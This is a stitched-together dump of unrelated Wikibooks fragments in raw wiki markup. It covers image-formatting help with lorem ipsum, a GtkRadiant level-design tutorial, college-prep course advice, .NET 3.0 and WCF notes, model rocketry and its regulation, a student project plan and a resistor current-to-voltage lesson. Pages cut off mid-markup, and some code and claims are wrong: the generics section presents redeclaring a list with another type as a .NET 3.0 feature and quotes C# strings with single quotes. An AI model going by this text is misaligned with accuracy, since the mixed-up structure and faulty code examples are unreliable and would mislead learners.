[[File:Vista-folder.png|none]] &lt;span style=&quot;color:#996633&quot;&gt;Mauris at ipsum vitae est lacinia tincidunt. Maecenas elit orci, gravida ut, molestie non, venenatis vel, lorem. Sed lacinia. Suspendisse potenti. Sed ultricies cursus lectus. In id magna sit amet nibh suscipit euismod. Integer enim. Donec sapien ante, accumsan ut, sodales commodo, auctor quis, lacus. Maecenas a elit lacinia urna posuere sodales. Curabitur pede pede, molestie id, blandit vitae, varius ac, purus. Morbi dictum. Vestibulum adipiscing pulvinar quam. In aliquam rhoncus sem. In mi erat, sodales eget, pretium interdum, malesuada ac, augue. Aliquam sollicitudin, massa ut vestibulum posuere, massa arcu elementum purus, eget vehicula lorem metus vel libero. Sed in dui id lectus commodo elementum. Etiam rhoncus tortor. Proin a lorem. Ut nec velit. Quisque varius. Proin nonummy justo dictum sapien tincidunt iaculis. Duis lobortis pellentesque risus. Aenean ut tortor imperdiet dolor scelerisque bibendum. Fusce metus nibh, adipiscing id, ullamcorper at, consequat a, nulla.&lt;/span&gt;&lt;/i&gt;

Here we can see how the image appears to be completely separate to the text.

==Resizing an Image==
&lt;pre&gt;
[[File:Vista-folder.png|25px]]
&lt;/pre&gt;

&lt;i&gt;&lt;span style=&quot;color:#996633&quot;&gt;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Duis tellus. Donec ante dolor, iaculis nec, gravida ac, cursus in, eros. Mauris vestibulum, felis et egestas ullamcorper, purus nibh vehicula sem, eu egestas ante nisl non justo. Fusce tincidunt, lorem nec dapibus consectetuer, leo orci mollis ipsum, eget suscipit eros purus in ante.&lt;/span&gt;
[[File:Vista-folder.png|25px]] &lt;span style=&quot;color:#996633&quot;&gt;Mauris at ipsum vitae est lacinia tincidunt. Maecenas elit orci, gravida ut, molestie non, venenatis vel, lorem. Sed lacinia. Suspendisse potenti. Sed ultricies cursus lectus. In id magna sit amet nibh suscipit euismod. Integer enim. Donec sapien ante, accumsan ut, sodales commodo, auctor quis, lacus. Maecenas a elit lacinia urna posuere sodales. Curabitur pede pede, molestie id, blandit vitae, varius ac, purus. Morbi dictum. Vestibulum adipiscing pulvinar quam. In aliquam rhoncus sem. In mi erat, sodales eget, pretium interdum, malesuada ac, augue. Aliquam sollicitudin, massa ut vestibulum posuere, massa arcu elementum purus, eget vehicula lorem metus vel libero. Sed in dui id lectus commodo elementum. Etiam rhoncus tortor. Proin a lorem. Ut nec velit. Quisque varius. Proin nonummy justo dictum sapien tincidunt iaculis. Duis lobortis pellentesque risus. Aenean ut tortor imperdiet dolor scelerisque bibendum. Fusce metus nibh, adipiscing id, ullamcorper at, consequat a, nulla.&lt;/span&gt;&lt;/i&gt;

==Thumbnailing an Image==
If you wish to add a caption to an image and resize it, use 'thumb' instead of 'frame'.

&lt;pre&gt;
[[File:Vista-folder.png|75px|thumb|right|Caption goes here]]
&lt;/pre&gt;

&lt;i&gt;&lt;span style=&quot;color:#996633&quot;&gt;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Duis tellus. Donec ante dolor, iaculis nec, gravida ac, cursus in, eros. Mauris vestibulum, felis et egestas ullamcorper, purus nibh vehicula sem, eu egestas ante nisl non justo. Fusce tincidunt, lorem nec dapibus consectetuer, leo orci mollis ipsum, eget suscipit eros purus in ante.&lt;/span&gt;
[[File:Vista-folder.png|75px|thumb|right|Caption goes here]] &lt;span style=&quot;color:#996633&quot;&gt;Mauris at ipsum vitae est lacinia tincidunt. Maecenas elit orci, gravida ut, molestie non, venenatis vel, lorem. Sed lacinia. Suspendisse potenti. Sed ultricies cursus lectus. In id magna sit amet nibh suscipit euismod. Integer enim. Donec sapien ante, accumsan ut, sodales commodo, auctor quis, lacus. Maecenas a elit lacinia urna posuere sodales. Curabitur pede pede, molestie id, blandit vitae, varius ac, purus. Morbi dictum. Vestibulum adipiscing pulvinar quam. In aliquam rhoncus sem. In mi erat, sodales eget, pretium interdum, malesuada ac, augue. Aliquam sollicitudin, massa ut vestibulum posuere, massa arcu elementum purus, eget vehicula lorem metus vel libero. Sed in dui id lectus commodo elementum. Etiam rhoncus tortor. Proin a lorem. Ut nec velit. Quisque varius. Proin nonummy justo dictum sapien tincidunt iaculis. Duis lobortis pellentesque risus. Aenean ut tortor imperdiet dolor scelerisque bibendum. Fusce metus nibh, adipiscing id, ullamcorper at, consequat a, nulla.&lt;/span&gt;&lt;/i&gt;

      <text xml:space="preserve">'''Attention: '''While this is a book or tutorial about mapping and level design in GtkRadiant, which should be similar for all games that use the ''[[w:id tech 3|id tech 3]]'' or ''[[w:id tech 4|id tech 4]]'' engines, there are still differences like what textures or models are available etc. etc. Some games also have custom features which may not work with other games. This book uses GtkRadiant to map for the game ''Jedi Knight 3: Jedi Academy'' so if you are following this book, but using a different game, the textures or models in the examples may not be available, which means that you have to use something different.

==If you need help==
If you don't understand something in this book, for example a word or a procedure, or simply need any other help using this program, just write about it on this book's [[talk:GtkRadiant|talk page]]. I will then add the thing you don't understand, either as word to the glossary, or if it's error messages, I will add a ''Error messages'' section where I will list the messages that people report and solutions to them.

If you don't get an answer there, try contacting one of the authors of this book (&quot;Yzmo&quot; or &quot;Darth NormaN&quot;) on a Jedi Academy related mapping forum.

==If you want to help==
If you know a bit about mapping, which isn't covered yet, you can help this book by writing about it. In case you don't know what to write about, just go for one of the &lt;font color=&quot;#CC0000&quot;&gt;[[here be a red red link hopefully dont make this page|red links]]&lt;/font&gt;.

      <text xml:space="preserve">Sometimes, abilities do not translate into stellar grades. An athlete on the All-State basketball team has to work hard to maintain fitness, and colleges realize this. So don't worry if your biggest talent is not a class in school. However, since you have no grades, you must ''show'' colleges that your ability exists.

      <text xml:space="preserve">==English==
You should take an English class all four years of high school. If possible, take the AP Language and Composition class in [[../Junior year/]], and AP Literature in [[../Senior year/]].

==Math==
Try to take the most challenging course that you can handle. A B- in Algebra 2 looks better on your transcript than an A- in Math 3. You should take 4 years of math, too.

==Science==
Try and take 3 years of science, 2 of which have labs. If you are planning on majoring in a science field, take science lab courses all 4 years.

==History==
Colleges would like to see at least two years of history - one of world history, and the other of American History. Again, this depends on your intended major - political science majors should probably take 3 years of history (1 AP) and AP Government in Senior year.

==Foreign Language==
Most colleges require two years of foreign language, if they require a foreign language at all. However, this does not mean you should stop learning a second language after [[../Sophomore year/]]. Learning [[Spanish]], [[Arabic]], or [[Chinese]] can take you to places and jobs you never could've otherwise had.

==Electives==
If you enjoyed a specific elective in middle school, stick with it! Especially if it is in the performing arts, this can be a way to show your [[../Talent and Athletics|talent]]. Music electives impress colleges more than non-academic electives (such as woodworking or pottery), but unless you are very skilled at music, an academic elective (computer science, journalism) may be a better choice.

I'm not really compatible with [[Cookbook]] on Wikibooks (I want original recipes and a rating system, whereas Cookbook is more like a textbook of standard recipes), so I'll eventually move it somewhere else, such as [http://www.communipes.com/ Communipes].

Hello {{PAGENAME}}, '''[[Wikibooks:Welcome, newcomers|welcome]] to [[Wikibooks]]'''!

{| style=&quot;background:white; border:1px solid #abd5f5;; padding:0px; border-spacing:0px;&quot;
 ! style=&quot;background:#d0e5f5;&quot; | Here are some tips to help you get started
 |-
 | style=&quot;padding:5px;&quot; |
* Wikibooks is a collection of open-source textbooks. See [[WB:WIW|What is Wikibooks]] to find out what types of books are acceptable.
* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* You should sign your name on Talk and vote pages using four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window that will insert this, too; it looks like part of a signature.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[WB:SL|Staff Lounge]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
* Remember to maintain a [[Wikibooks:Neutral point of view|Neutral point of view]].
* Explore, [[Wikibooks:Be bold in updating pages|be bold in editing pages]], and have fun!
 |}

You will find more resources in [[Wikibooks:Community Portal|Community Portal]]. If you want to ask a question, visit the [[Wikibooks:Study help desk|Study help desk]], the [[Wikibooks:Staff lounge|Staff lounge]], [[Wikibooks:IRC channels|IRC channel]] or ask me personally on my talk page. For site news, see the [[WB:BB|Bulletin board]]. It might be a good idea to add this page to your &quot;watchlist&quot; so that you can see when any new information is posted there. You can do that by clicking the tab labeled &quot;watch&quot; at the top of the page.

Good luck! 

You might also be interested to read our [[Cookbook:Policy|Cookbook policy]] page and talk to other [[Cookbook talk:Table of Contents|Cookbook editors]]. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 02:46, 26 June 2007 (UTC)</text>

'''The Comprehensive Opensource Handbook for Learning Wikibooks'''   {{stage short|00%}}&lt;br/&gt;

&lt;small&gt;This book is for Wikibookians of every level. Its purpose is to walk you through your Wikibook journey, starting from being a Wikibook reader. Chapter 1 covers the things you can do with a Wikibook, from reading it for your own edification, to printing it, to using it in a classroom. As you read a Wikibook, you may come across an error, and if you are willing to correct that error yourself, you are ready to read chapter 2 - becoming a Wikibook editor. As a Wikibook editor, you will find yourself fixing typos, correcting spelling, grammatical, or factual errors, or even expounding at length on a subject for which you have a passion. You may even decide you'd like to start your own Wikibook. At this point you become a Wikibook writer. Chapter 3 tells you how to start a Wikibook, how to structure it, how to attract readers, and how to recruit contributors. As your book gains more contributors, you may find them looking to you for advice and for help with administrative tasks. That would be a good time for you to read chapter 4, The Wikibook Administrator.&lt;/small&gt;

      <text xml:space="preserve">{{.NET Framework 3.0}}

Windows Communication Foundation ('''codenamed: Indigo''') is a new Windows Vista framework designed to make it easier for application in computer or across multiple computers in a network to communicate. 

It is one of the four main application development interfaces brought with .NET Framework 3.0. It is compatible for usage with Microsoft Windows XP, Windows 2003, Windows Longhorn Server and Microsoft Windows Vista.

Windows Communication Framework (WCF) combines the features of .NET Remoting, Web services, Distributed Transactions and Message Queues.

WCF uses SOAP messages for communication.  When a WCF process communicates with a non–WCF process, XML-based encoding is used for the SOAP messages but when it communicates with another WCF process, the SOAP messages are encoded in an optimized binary format.

== WCF Service ==

A WCF service is made of three components: A ''service'' that implements the service to be provided, a ''host environment'' where the service runs and one or more ''endpoints'' or ''contracts''

WCF provides unification, interoperability and service-oriented development.

== Types of Contracts ==

There are three different types of contracts in use:

* Service Contracts
* Data contracts
* Operation Contracts

=== Service Contracts ===

The service contracts refer to the entire service.&lt;blockquote&gt;A service contract is not different from a webservice but only a part of the service&lt;/blockquote&gt;. 

Service Contracts are a group of classes designated as operations. A service contract has a 'service contract' tag as seen in  the following example.


'''&lt;pre&gt;[ServiceContract]
interface IMa
{&lt;/pre&gt;
'''


It performs multiple operations through its different classes. Each of these classes is designated as an &quot;operation&quot;. 

Classes may be used as service contracts but it is generally recommended that interfaces be used. The advantage of using classes as &quot;Service Contracts&quot; involve speed and simplicity. However, manage classes do not support inheritance and it wouldnt be possible to run  all the operations of a service contract at the same time.

It is beneficial to use parameters in service contracts as service contracts often pass on values than reference to values. The primitive data types that service contracts use are serializeable by default.

=== Data Contracts ===

Data contracts are generally used to specify the data members used in a contract. Data members are marked with a &quot;Data Members&quot; attribute. Members not specified as 'Data Members' are permitted but they shall not be a part of the contract and could not be implemented.

'''Syntax'''

The syntax for DataContracts attribute is

&lt;pre&gt;
[AttributeUsageAttribute(AttributeTargets.Class|AttributeTargets.Struct|AttributeTargets.Enum, Inherited=false, AllowMultiple=false)] 
public sealed class DataContractAttribute : Attribute
&lt;/pre&gt;


'''Example:'''
&lt;pre&gt;
[DataContract]
public class CustomerDetails
{
    //Serialized Member//
    [DataMember]
    public string CustomerName;

    //Serialized Member//
    [DataMember]
    private int Age;

    // This is not serialized because the DataMemberAttribute 
    // has not been applied.
    private string CustomerMailID;

}
&lt;/pre&gt;

=== Operation Contracts ===

Operation contracts are components of a service contract. Each and every method, a component of a service contract are tagged with the Operation contract attribute. Only methods designated as operations are considered as a part of the service.

'''Syntax'''

&lt;pre&gt;
[AttributeUsageAttribute(AttributeTargets.Method)] 
public sealed class OperationContractAttribute : Attribute
&lt;/pre&gt;



=== Message Contracts ===


Apart from these three types of contracts, there are message contracts which enable us to enter a parameter or return value. Message Contracts make it easier to serialize data so that a detailed knowledge of SOAP need not be necessary.

The components to be displayed as SOAP headers will be specified using MessageHeader attribute while SOAP body members will be specified using MessageBodyMember attribute.


'''Syntax'''
&lt;pre&gt;
[MessageContract]
public class ABC
{
  [MessageHeader] A;
  [MessageHeader] B;
  [MessageBodyMember] C;
  [MessageBodyMember] D;
  [MessageBodyMember] E;
}
&lt;/pre&gt;

== Contract Patterns ==

There are three types of contracts specified in WCF Programming model:


* Request/Reply Message Pattern
* one-way message pattern
* duplex message pattern

=== Request/Reply Message Pattern ===

A Request/Reply Message Pattern is one in which a request by a client is followed by a reply from the server. Here, parameter values could be sent to the server by the client and at the same time return values could be passed by the server to the client.

However, there are major drawbacks in this pattern. If the functions are not in order, then each and every statement is regarded as a request or a reply. This shall include even  statements which dont return values.

=== One-Way Message Pattern ===

Here, the client makes a request and the server responds and the client functions regardless of whether any message arrives from the server.

Here, the service need not bother about SOAP faults. Generally, the service does not wait for the application to process.

The one-way message pattern is the same as the request-reply pattern except that we set &quot;IsOneWay&quot; property to &quot;true&quot; in order to specify that the pattern is a one-way message pattern.

=== Duplex Message Pattern ===

The working behind the duplex message pattern is same as that of request/reply pattern except that the server and the client send messages independently of one another compared to request/reply pattern where both request and reply are parts of the same process.

== A WCF Service Code Example ==

&lt;pre&gt;
[ServiceContract]
class HelloService 
{ 
  [OperationContract]
  [PrincipalPermission(SecurityAction.Demand, 
    Role = “Adminstrators&quot;)]
  [TransactionFlow(TransactionFlowOption.Mandatory)]
  [OperationBehavior(TransactionScopeRequired = true,
    TransactionAutoComplete = true)]
  String Hello(String Greeting) {return Greeting;}
}

&lt;bindings&gt;
  &lt;wsHttpBinding&gt;
    &lt;binding name=&quot;Binding1“  transactionFlow=&quot;true&quot;&gt;

      <text xml:space="preserve">{{.NET Framework 3.0}}

.NET 3.0 supports nullable data types. Previously, nullification of only 'int' values were supported by .NET. However, this addition comes as a big boon to developers who might find it easy even to have 'null date-time' values and the kind. '''Values might be nullifed in .NET by placing a '?' after the datatype name in the variable declaration'''

'''Examples'''
&lt;pre&gt;
int? num = null;
DateTime? dt = null;
&lt;/pre&gt;

Note: Nullable support is available since .Net 2.0</text>

      <text xml:space="preserve">{{.NET Framework 3.0}}

Microsoft has introduced new generical features in its .NET 3.0. Until now, it was mandatory that the whole list should be declared as a single data type. However, in .NET 3.0, it is possible to have multiple declarations of the same list with multiple data type and the datatype of the data contained in it changes.

== Example ==

&lt;pre&gt;
List&lt;string&gt; customerList = new List&lt;string&gt;(); 
customerList.Add('Ravi');
customerList.Add('Bala');
List&lt;int&gt; customerList = new List&lt;int&gt;();
customerList.Add(1);
&lt;/pre&gt;</text>

Mailing lists are:

* Simple 
* Available
* Easy to use
* Reliable
* Efficient

However, they are pretty much a single-purpose tool. They are meant for one thing, and they do it good. Hence [[Wikipedia:Opinel_knife|Opinel]], not [[Wikipedia:Swiss_Army_knife|Swiss army knife]].

[[Image:SquareSelectRadiant.gif|left|border]]

First drag your mouse from somewhere in the upper, left section of the screen to the lower, right section of the screen, a red square should appear. Now, move the square around by clicking somewhere in the square and moving the mouse, then resize by clicking and holding the mouse down a bit outside the square on the side you want to move and dragging it until it has reached the correct size. Try to make it fit the ''128'' marks on all sides.
Also try to look at the square in 3D by right clicking somewhere in the grey 3D window and scrolling back with the mouse, maybe you have to move the mouse around a bit as well, try to get used to navigating in the 3D view because being able to do so will help you a lot in the future. When looking in the 3D view you will see a cube, which is rather thick, this cube is going to be the floor of our room, but, its still a bit thick, right, so lets make it thinner.
|}

{|
|
[[Image:MakeFloorFlatRadiant.gif|left|border]]
|
Right now we see our box from the top, so we need to switch viewpoint to be able to see it from the side, to do so, press '''''CTRL+TAB''''' or the [[Image:XYZButtonRadiant.png|22px]] button in the toolbar. Note that the graphic in the middle of the grid which shows the axis changes. Now you should look at the box from the side seeing a rectangular square. Resize the square to make it ''8'' units (1 row of grid blocks) thick, then enter the 3D view again by right clicking in the grey window, note that the box is now a lot thinner, in fact, its more a flat something than a box. Now deselect everything ('''''ESC''''') and the floor is done. Congratulations, you just made your first brush!
|}

{|
|
[[Image:TextureRadiant.gif|left|border]]
|
As you can see in the 3D view, the floor still looks weird, this is because the floor isn't textured yet, so, start by selecting the floor again by holding down '''''SHIFT''''' and clicking on the floor. Before applying a texture to the floor, you should caulk it, this means that you apply a {{GtkRGloss|caulk|''caulk''}} shader to all surfaces (don't try to understand that yet), which is easy to do, so once you have selected the floor, press the caulk button in the toolbar [[Image:CaulkButtonRadiant.png|22px]] and you will see that all surfaces in the 3D view turn pink with the words caulk on it. No worries, it won't look like that ingame, in fact, everything which is caulked is ''invisible'' ingame, so what you just did was making the whole block invisible.

Now to the ''real'' texturing which means that you apply an actual image to the upper surface of your floor. So, start by double clicking a texture folder in the texture folders list, then wait a moment and textures should appear in the grey area nearby. Click one of those textures, then hold down '''''CTRL+SHIFT''''' and click your middle mouse button (scroll wheel) on the surface where you want to apply the texture, this is best done in the 3D view. When done, one of the surfaces should have a texture on it, and all other should be pink... if not, just repeat this and it'll work sooner or later.

If you want, you can train to navigate around in the 3D view a bit more, and see if you can change the viewpoints, try to texture the floor with some different textures, select and deselect stuff, and so on until you know for sure what you are doing. This is important because the next chapter will build on stuff from this one, i.e. I won't explain step by step how to texture stuff, or how to resize or move brushes.

[[image:Model Rocket Launch.jpg|thumb|250px|A model rocket.]]
'''Model rocketry''' is a hobby similar to model airplanes. In the United States today, there are two quite distinct areas of hobby rocket activity, amateur rocketry on the one hand and model and high-power rocketry on the other.

===Amateur Rocketry===
''Amateur rocketry'' hobbyists experiment with fuels and make their own rocket motors, launching a wide variety of types and sizes of rockets. Amateur rocketeers have been responsible for significant research into hybrid rocket motors, and have built and flown a variety of solid, liquid, and hybrid propellant motors. Amateur rockets can be dangerous because noncommercial rocket motors fail more often than commercial rocket motors. Amateur rocketry was an especially popular hobby in the late 1950s, following the launch of Sputnik. However, an appalling accident rate led individuals such as G. Harry Stine and Vernon Estes to make model rocketry a safe and widespread hobby by developing and publishing the National Association of Rocketry Model Rocket Safety Code, and by commercially producing safe, professionally-designed and manufactured model rocket motors. Model rocketry by definition then became a separate and distinct activity from amateur rocketry. The Tripoli Rocketry Association sanctions some amateur activities, which they call &quot;experimental rocketry,&quot; provided certain safety guidelines are followed, and provided the motors are of relatively standard design.

===Model and High Power Rocketry===
''Model rocketry'' and ''High powered rocketry'' involve professionally-manufactured solid-fuel or hybrid liquid/solid fuel rocket motors. Since these motors are professionally designed and constructed, they are far safer than motors produced by individuals for use in amateur or experimental rocketry. The motors also are tested and certified by the National Association of Rocketry or the Tripoli Rocketry Association and come in standardized sizes and powers.

==Model Rocketry==
Since the early 1960s, a copy of the Model Rocket Safety Code has been provided with most model rocket kits and motors. Model rocketry is a very safe hobby, provided precautions are taken as given in the safety code.

[[Image:Model rocket engine diagram.png|right|thumb Anatomy of a model rocket engine.  A typical engine is about three inches long]]

Small model rocket motors are single use engines, with cardboard bodies and lightweight molded ceramic nozzles, ranging in power class from 1/8-A to E. They contain a black powder propellant. Motors are electrically ignited with a short length of nichrome wire pushed into the nozzle and held in place with flameproof wadding or a plastic plug. On top of the propellant is a tracking delay charge which produces smoke but essentially no thrust as the rocket slows down and arcs over. When the delay charge has burned through, it ignites an ejection charge, which is used to push out a parachute or a streamer (there are other more complicated recovery devices, but parachutes and streamers are the most common). 

===What the Numbers Mean===
[[Image:Rocket engine.jpg|thumb|right|Two model rocket engines.]]
Model rocket motors produced by companies like Estes Industries and Quest Aerospace are stamped with a code (such as A10-3T or B6-4) that tells several things about of motor. The letter at the beginning of the code indicates the motor's total impulse (in newton-seconds).  Each successive letter in alphabetical order has up to twice the power of the letter preceding it. This means that a &quot;C&quot; motor has twice the impulse of a &quot;B&quot; motor. The number that comes after the letter indicates the motor's average thrust, measured in newtons. A higher thrust will result in higher liftoff acceleration, and can be used to launch a heavier model.  Within the same letter class, a higher average thrust also implies a shorter burn time (e.g., a B4 motor will burn longer than a B6). The last number is the delay in seconds between the end of the thrust phase and ignition of the ejection charge. Motors that end in a zero have no delay or ejection charge, and motors that end in a &quot;T&quot; (for &quot;tiny&quot;) indicate that they are for use in a smaller rocket than standard motors. &quot;T&quot; motors are 13 mm in diameter by 45 mm long, while standard A, B and C motors are 18 mm in diameter by 70 mm long.  Larger C, D, and E class black powder motors are also available; they are 24 mm in diameter and either 70 (C and D motors) or 95 mm long (E motors).

Model rocketeers often experiment with rocket sizes, shapes, payloads, multistage rockets, and recovery methods.  Some rocketeers build scale models of larger rockets, space launchers, or missiles. 

Larger rocket motors are also available, using composite propellants made of ammonium perchlorate and a rubbery binder substance contained in a hard plastic case. These motors range in impulse from the D to the O range. Composite motors produce more impulse per unit weight than do black powder motors. Reloadable motors are also available. These are commercially-produced motors requiring the user to put propellant grains, o-rings and washers (to contain the expanding gases), delay grains and ejection charges into special non-shattering aluminum motor casings with screw-on or snap-in ends (closures). The advantage of a reloadable motor is the cost: because the main casing is reusable, reloads cost significantly less than single-use motors of the same impulse.  Reloadable motors are available from G through O class.

Model rocketry is enjoyed by many different levels of hobbyist, from grade-school children launching 3 in (75 mm) tall models in the baseball field, to teams of adults launching 200 pound (100 kg) behemoths thousands of feet into the air.  Model rocketry is often credited as the most significant source of inspiration for children who eventually become scientists and engineers.

===Model rockets of special interest===
Model rockets equipped with the Astrocam film camera or the Oracle digital camera, or with home built equivalents, can be used to take aerial photographs.

==High Power Rocketry (HPR)==
High power model rockets are propelled by larger motors ranging from H to O and can be up to 40 feet tall.  Their motors are almost always reloadable rather than single-use in order to reduce cost. Recovery and/or multi-stage ignition may be initiated by small on-board computers, which use an altimeter or accelerometer for detecting when to ignite engines or deploy parachutes.  Due to the extreme speeds (often over Mach 1) and high altitudes (often over 10,000 ft.) these rockets can attain, a small drogue parachute is often deployed at apogee, and a larger one deployed after the rocket reaches a lower altitude.  This reduces the distance the rocket drifts considerably. High powered model rockets can carry large payloads, including cameras and instrumentation such as GPS units, and are not much different than their military counterparts.  Since 9/11, the high powered model rocket hobby has been even more carefully monitored by the government.  Strict measures are in place to control who can participate, and launch permits are required. 

==Controversy==
Both amateur and model rocketry have come under controversy in the United States following the terrorist attacks on New York and Washington D.C., as federal and state authorities allege that model rockets can be modified to act as weapons used to shoot down aircraft within the United States.  Authorities argue that all members of the hobby should have to be licensed and their purchases recorded and reported to federal agencies.  Critics of such policies, particularly those involved in the hobby itself, including several ex-military members now involved in rocketry, argue that while building model rockets capable of going great distances is a relatively simple feat, guidance systems are exceedingly difficult to design&amp;mdash;requiring an extensive educational and technical background &amp;mdash; rendering the likelihood of anyone being capable of designing a guidance system for homing in on an aircraft extremely low.  Advocates of regulation also neglect that there are many other easier, unregulated ways to accomplish any such illicit goal &amp;mdash; for example, via a model airplane, which are actually designed to be guided.

The ammonium perchlorate composite propellant (APCP) used in large rocket motors is classified by the government as a low explosive.  This classification is being challenged in a lawsuit, based upon the fact that APCP is not actually capable of detonation.  Following President Bush's signing of the Safe Explosives Act in 2002, hobbyists who had routinely purchased engines and APCP for years had to be fingerprinted, submit to background checks, and allow local and federal investigators at any time into their homes for inspections to ensure proper storage of the propellant.  

The amount of APCP regulated is 62.5 grams and above, estimated to be about enough for a motor five or six inches (125 to 150 mm) long, one inch (25 mm) in diameter, and with a thrust of ten pounds force (44 N) for two seconds (88 newton-seconds impulse). This is a &quot;G engine&quot;, which cannot exceed 160 newton-seconds impulse and are the largest rocket engines allowed for model rocketry. An &quot;O engine&quot;, which cannot exceed 40960 newton-seconds impulse is the largest rocket engine allowed for high powered rocketry, which already requires certification.

According to ''The Wall Street Journal'', regulations on the transport of rocket fuel across state lines have been in place for many years but were not widely enforced until after the terrorist attacks on America, at which point authorities clamped down on regulations and added many new ones.  Thereafter, amateur rocket enthusiasts have made use of a little-known law allowing the manufacturing of low explosives for personal purposes, initially intended for farmers who mixed fertilizer with fuel oil to create explosives to blast their own irrigation ditches. Amateur hobbyists use this law to justify &quot;cooking parties,&quot; at which many gather and mix their own fuel legally and anonymously.</text>

      <text xml:space="preserve">Group #1 WikiBook Plan of Action

 Following our individual and team reviews of the existing Groups and Teams WikiBook Conflict Chapter, we have agreed that there are at least a few areas of the chapter that we can improve upon. To start off, we think that conflict should initially be better defined so as to give a solid basis for the chapter and the information that it contains. We also have agreed that it would be useful if there were more (some) illustrations and better examples or stories that focus on conflict in an effort to tighten the chapter and more so support our conclusions, if you will. We also unanimously concur that positive conflict has its merits, relevance, and benefits, none of which have been incorporated into the chapter. The layout and format also seem a bit inconsistent and potentially confusing to readers. We plan to better organize the chapter to help make it more easily accessible to readers and useful in a visually appealing manner.

 To accomplish the aforementioned goals for the WikiBook project, we have created a revised outline and will work on and complete the given sections and tasks contained therein. We now have a much better understanding of each other’s potential strengths and areas for opportunity in this project, which stems from our post-class team meeting on June 20 where these topics were addressed and disclosed by each team member to the team in a group discussion. In this meeting we all became more familiar with each other and better equipped to understand how each team member works best and thought about how to best utilize a given team member’s abilities, likes, and desires into the project.  It was in this meeting that we also set up a team process and general protocol for “checking out” the WikiBook, which entails e-mailing all team members when doing so in an effort to maintain the overall cohesive construction and peer review of the WikiBook.

&lt;span style=&quot;font-size:100%; color:#FF0000&quot;&gt;'''Circuit idea:''' ''A current passing through a resistor makes a proportional voltage drop appear across the resistor.''&lt;/span&gt;


[[Image:I-to-v_block_diagram_450.jpg|right|thumb|350px|&lt;center&gt;Fig. 1. How do we convert current into voltage?&lt;/center&gt;]]

== Problem: ''How to convert current into voltage'' ==

As regards the circuit inputs, we prefer voltage to current as an input quantity. Only, some devices have a current input (an ammeter, a bipolar transistor, a transimpedance amplifier, a Norton amplifier, etc.) In these cases, we connect a voltage-to-current converter before the device; as a result, it acquires a voltage input.

Similarly, we prefer voltage to current as an output quantity. Only, there many devices having a current output (actually all the active electronic components - a current source, a bipolar transistor, a tube, a FET transistor, etc.) In these cases, we need to connect the reverse current-to-voltage converter after the device, in order to get a voltage output. Since the current-output devices are more widespread than current-input ones, this circuit is more popular than the opposite voltage-to-current converter. Then, let's build it! 

As usual, there are two versions of the circuit - passive (&quot;bad&quot;) and active (&quot;good&quot;); here, we begin with the &quot;bad&quot; passive version. Then, in another story dedicated to the [[Circuit Idea/Op-amp Inverting Current-to-Voltage Converter| &quot;good&quot; active version]], we will show that again there is a close interrelation between the two circuits: the active version is come from the passive one (the active version comprises the passive one, it is just an improved passive version). In this way, we will show the evolution of the famous circuit moving, step-by-step, from simple to complex.

== Basic non-electrical idea: ''Flow causes pressure'' ==

Trying to find an answer to the question, &quot;What causes what?&quot; in the [[Circuit Idea/Passive Voltage-to-Current Converter|previous story]], we assumed that ''pressure causes flow''. Conversely, there are many situations in our routine where ''flow causes pressure''. In these case, something moving encounters an obstacle; as a result, a pressure appears. Here are some examples: ''mechanical'' (if we try to stop a moving car with our, it exerts pressure to us), ''pneumatic'' (imagine a constant flow pump moving air through a closed loop of pipes -pinch the hose in the middle and you will see that a pressure appears across the bottleneck), ''social'' (stand in someone's way and you will experience &quot;pressure&quot;), etc. Let's finally generalize all these situations.

In order to induce a pressure, we have to put an impediment in flow's way. In this arrangement, ''the flow-like, pressure-like and impediment-like attributes are interrelated'' as before. Usually, ''the output pressure-like variable is proportional to the input flow-like one''; so, we may say that ''the impediment converts the flow-like variable into a pressure-like one''.

== Basic electrical idea: ''Current causes voltage'' ==

=== Building the circuit ===

[[Image:I-to-v_building_1000.jpg|right|thumb|350px|Fig. 2. In the Ohm's current-supplied circuit, the resistor R acts as a simple current-to-voltage converter.]]

In electricity, we may observe an analogous ''current-causes-voltage phenomenon'': if a current I&lt;sub&gt;IN&lt;/sub&gt; flows through a resistor R (Fig. 2), the latter impedes (resists) the current; as a result, a proportional voltage drop V&lt;sub&gt;R&lt;/sub&gt; = R.I&lt;sub&gt;IN&lt;/sub&gt; appears across the resistor.&lt;ref&gt;[http://www.circuit-fantasia.com/my-students/ske2004/classes/current-ske-2.htm Elementary passive converters with voltage output] is a teacher's story about the simplest electric converters producing a current.&lt;/ref&gt; In this current-supplied circuit, the voltage drop V&lt;sub&gt;R&lt;/sub&gt; acts as an output voltage V&lt;sub&gt;OUT&lt;/sub&gt;. Only, note that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is created not by the resistor; it is created by the excitation voltage source inside the input current source. We may say that this is a ''current-causes-voltage formulation'' of Ohm's law: '''V = R × I'''

In this current-supplied circuit, the resistor R determines the voltage across it. We usually say that the resistor converts the current I&lt;sub&gt;IN&lt;/sub&gt; into a proportional voltage V&lt;sub&gt;OUT&lt;/sub&gt; or it serves as a simple current-to-voltage converter - a linear circuit with transfer ratio k = V&lt;sub&gt;OUT&lt;/sub&gt;/I&lt;sub&gt;IN&lt;/sub&gt; [V/mA].

&lt;center&gt;''A bare resistor can convert current into voltage.''&lt;/center&gt;

=== Exploring the circuit operation ===

